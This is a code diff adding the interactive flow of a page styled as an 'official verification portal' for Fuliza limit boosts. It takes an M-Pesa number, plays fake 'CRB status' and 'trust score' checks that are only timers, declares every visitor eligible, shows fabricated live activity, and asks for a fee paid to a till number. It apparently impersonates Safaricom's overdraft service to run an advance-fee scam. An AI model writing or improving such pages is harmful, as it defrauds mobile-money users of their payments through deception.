@@ -258,7 +258,116 @@ setInterval(()=>{
   if(el){ el.innerHTML = generateActivity(); }
 },5000);
 
-// (rest of your JS remains unchanged)
+function render(){
+  const app = document.getElementById("app");
+
+  if(step===1){
+    app.innerHTML = `
+    <div class="card">
+      <div class="top-icon">👤</div>
+      <h2 style="font-weight:800; font-size:26px; margin-bottom:5px;">Fuliza Plus+</h2>
+      <div class="sub-title">OFFICIAL VERIFICATION PORTAL</div>
+      <p class="desc">Verify your identity to unlock higher daily transaction limits.</p>
+      <input class="input" id="phoneInput" placeholder="Enter M-Pesa Number" maxlength="10">
+      <button class="green" onclick="next()">Check My Eligibility</button>
+    </div>`;
+  }
+
+  if(step>=2 && step<=5){
+    const texts = ["Connecting...","Checking Usage History...","Verifying CRB Status...","Finalizing Trust Score..."];
+    app.innerHTML = `
+    <div class="card">
+      <div class="loader"></div>
+      <h3>${texts[step-2]}</h3>
+      <p>Accessing secure databases...</p>
+    </div>`;
+    setTimeout(()=>{step++;render();},1500);
+  }
+
+  if(step===6){
+    app.innerHTML = `
+    <div class="card">
+      <div class="success-icon">✓</div>
+      <h2>Congratulations!</h2>
+      <p>High Trust Score Detected. 
+      <span class="phone" id="userNumber"></span> is eligible for a boost.</p>
+      <button class="dark" onclick="next()">Proceed to Upgrade Limit</button>
+    </div>`;
+
+    setTimeout(()=>{
+      let num = localStorage.getItem("userNumber") || "";
+      let el = document.getElementById("userNumber");
+      if(el){ el.textContent = num; }
+    },100);
+  }
+
+  if(step===7){
+    app.innerHTML = `
+    <div class="card">
+      <div class="live-activity">
+        <div class="live-icon">↻</div>
+        <div>
+          <div class="live-label">LIVE ACTIVITY</div>
+          <div class="live-text" id="liveActivityText">${generateActivity()}</div>
+        </div>
+      </div>
+      <h3>Select Your Limit</h3>
+      <div class="grid">
+        ${limits.map(l=>`
+          <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
+            <strong>Ksh ${l.amount}</strong>
+            <div class="fee">Fee: Ksh ${l.fee}</div>
+          </div>`).join("")}
+      </div>
+      <button class="green" onclick="openModal()">Upgrade to Ksh ${selectedAmount}</button>
+    </div>`;
+  }
+}
+
+function next(){
+  if(step===1){
+    let number = document.getElementById("phoneInput").value.trim();
+    number = number.replace(/\s+/g, "");
+
+    if(!/^\d{10}$/.test(number)){
+      alert("Enter a valid M-Pesa number (10 digits only)");
+      return;
+    }
+
+    const safaricomPrefixes = [
+      "070","071","072","074","075","076","077","078","079",
+      "0110","0111","0112","0113","0114","0115"
+    ];
+
+    const isSafaricom = safaricomPrefixes.some(prefix => number.startsWith(prefix));
+
+    if(!isSafaricom){
+      alert("Only Safaricom numbers are allowed. Please enter a valid Safaricom number.");
+      return;
+    }
+
+    localStorage.setItem("userNumber", number);
+  }
+  step++;
+  render();
+}
+
+function select(a){ selectedAmount = a; render(); }
+
+function openModal(){
+  let fee = getFee(selectedAmount);
+  document.getElementById("modal").style.display="flex";
+  document.getElementById("modalTitle").innerText = "Limit will be boosted to Ksh " + selectedAmount;
+  document.getElementById("modalFee").innerHTML =
+  `Enter your Safaricom number for VERIFICATION! Once payment to Till Number 
+  <b>6363781</b> is confirmed, your boost request will begin processing.`;
+  document.getElementById("payBtn").innerText = "Pay Ksh " + fee;
+}
+
+function closeModal(){
+  document.getElementById("modal").style.display="none";
+}
+
 document.addEventListener("DOMContentLoaded", function () {
   render();
 });
